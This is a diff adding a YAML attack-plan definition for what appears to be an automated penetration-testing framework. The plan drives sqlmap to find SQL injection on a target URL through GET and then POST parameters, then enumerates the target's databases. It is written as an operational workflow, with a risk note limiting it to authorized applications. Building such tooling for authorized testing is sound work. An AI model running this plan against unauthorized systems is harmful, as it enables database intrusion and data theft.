@@ -1,0 +1,60 @@
+# Mech-Unit attack intent — SQL injection discovery + data extraction.
+# Packages sqlmap methodology from workflows/templates/sql_injection_chain.yaml.
+id: web_sql_injection
+name: SQL Injection + Data Extraction
+category: web
+operator_label: "Test a web app for SQL injection"
+operator_description: >
+  Probes the target URL's parameters for injectable SQL, then extracts
+  database contents when a point is confirmed. Highest-yield web attack
+  when dynamic parameters exist.
+outcome: "Database access via SQL injection, or no injectable parameters"
+grants: [web.sql_injection, db.access]
+time_to_impact: minutes-to-tens-of-minutes
+noise: high
+risk_notes: >
+  sqlmap generates a large volume of malformed requests; WAFs and IR teams
+  will notice. Authorized applications only.
+
+preconditions:
+  - probe: tools_present
+    with: [sqlmap]
+
+plan:
+  - step: probe_injection
+    tool: sqlmap_scan
+    args:
+      url: "http://{{ target.host }}{{ target.path }}"
+      level: 2
+      risk: 2
+    max_wait: 1200
+    gate:
+      output: "injectable|injection point|might be injectable"
+    on_fail: retry_then_fallback
+    fallbacks:
+      - step: probe_post
+        tool: sqlmap_scan
+        args:
+          url: "http://{{ target.host }}{{ target.path }}"
+          data: "{{ target.post_data }}"
+          level: 3
+          risk: 2
+        gate:
+          output: "injectable|injection point|might be injectable"
+
+  - step: enumerate_dbs
+    tool: sqlmap_scan
+    args:
+      url: "http://{{ target.host }}{{ target.path }}"
+      data: "{{ target.post_data }}"
+      level: 3
+      risk: 2
+    max_wait: 1800
+    gate:
+      output: "available databases|\\[\\*\\]"
+    on_fail: warn
+
+artifacts:
+  sqlmap_log: "{{ plan_dir }}/sqlmap-output.log"
+
+llm_required: false
